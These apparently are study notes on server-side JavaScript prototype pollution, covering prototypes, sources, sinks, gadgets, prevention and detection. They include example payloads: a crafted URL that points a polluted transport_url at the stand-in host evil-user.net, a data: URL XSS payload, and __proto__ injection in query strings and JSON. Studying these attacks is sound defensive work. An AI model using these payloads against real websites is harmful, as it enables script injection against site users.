# BSCP
## Server-side Prototype Pollution
### Background
Every object in JavaScript is linked to another object of some kind, known as its prototype. By default, JavaScript automatically assigns new objects one of its built-in prototypes. For example, strings are automatically assigned the built-in `String.prototype`

Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. This enables developers to create new objects that can reuse the properties and methods of existing objects.

The built-in prototypes provide useful properties and methods for working with basic data types. For example, the `String.prototype` object has a `toLowerCase()` method. As a result, all strings automatically have a ready-to-use method for converting them to lowercase. This saves developers having to manually add this behavior to each new string that they create.

Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, `__proto__` is the de facto standard used by most browsers. This property serves as both a getter and setter for the object's prototype. This means you can use it to read the prototype and its properties, and even reassign them if necessary.

As with any property, you can access `__proto__` using either bracket or dot notation:

```
username.__proto__
username['__proto__']
```
You can even chain references to __proto__ to work your way up the prototype chain:
```
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object. This means developers can customize or override the behavior of built-in methods, and even add new methods to perform useful operations.

For example, modern JavaScript provides the `trim()` method for strings, which enables you to easily remove any leading or trailing whitespace. Before this built-in method was introduced, developers sometimes added their own custom implementation of this behavior to the `String.prototype` object by doing something like this:
```
String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}
```
Thanks to the prototypal inheritance, all strings would then have access to this method:
```
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```
### Vulnerability

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested properties.

Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.

Successful exploitation of prototype pollution requires the following key components:

* A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
* A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
* An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

__Prototype pollution sources__

A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:

* The URL via either the query or fragment string (hash)
* JSON-based input
* Web messages

__Prototype pollution sinks__

A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. 

__Prototype pollution gadgets__
A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:

* Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
* Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. Robust websites may also explicitly set the prototype of the object to `null`, which ensures that it doesn't inherit any properties at all.

__Example of a prototype pollution gadget__

Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:
```
let transport_url = config.transport_url || defaults.transport_url;
```
Now imagine the library code uses this `transport_url` to add a script reference to the page:
```
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```
If the website's developers haven't set a `transport_url` property on their `config` object, this is a potential gadget. In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by the `config` object and, therefore, set as the `src` for this script to a domain of the attacker's choosing.

If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:
```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```
By providing a `data: URL`, an attacker could also directly embed an XSS payload within the query string as follows:
```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```
Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix.

### Exploitation

`https://vulnerable-website.com/?__proto__[evilProperty]=payload`

```
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```
### Prevention

__Sanitizing property keys__

One of the more obvious ways to prevent prototype pollution vulnerabilities is to sanitize property keys before merging them into existing objects. This way, you can prevent an attacker from injecting keys such as `__proto__`, which reference the object's prototype.

__Preventing changes to prototype objects__

A more robust approach to preventing prototype pollution vulnerabilities is to prevent prototype objects from being changed at all.

Invoking the `Object.freeze()` method on an object ensures that its properties and their values can no longer be modified, and no new properties can be added. As prototypes are just objects themselves, you can use this method to proactively cut off any potential sources:

```
Object.freeze(Object.prototype);
```

The `Object.seal()` method is similar, but still allows changes to the values of existing properties. This may be a good compromise if you're unable to use `Object.freeze()` for any reason.

### Detection
__Why is server-side prototype pollution more difficult to detect than client-side?__
* No source code access - There's no easy way to get an overview of which sinks are present or spot potential gadget properties.
* Lack of developer tools - This limitation obviously doesn't apply to white-box testing.
* Successfully polluting objects in a server-side environment using real properties often breaks application functionality
* Pollution persistence - Once you pollute a server-side prototype, this change persists for the entire lifetime of the Node process and you don't have any way of resetting it.

#### Non-destructive techniques

__Detecting server-side prototype pollution via polluted property reflection__

An easy trap for developers to fall into is forgetting or overlooking the fact that a JavaScript for...in loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain.

__Note__: This doesn't include built-in properties set by JavaScript's native constructors as these are non-enumerable by default.
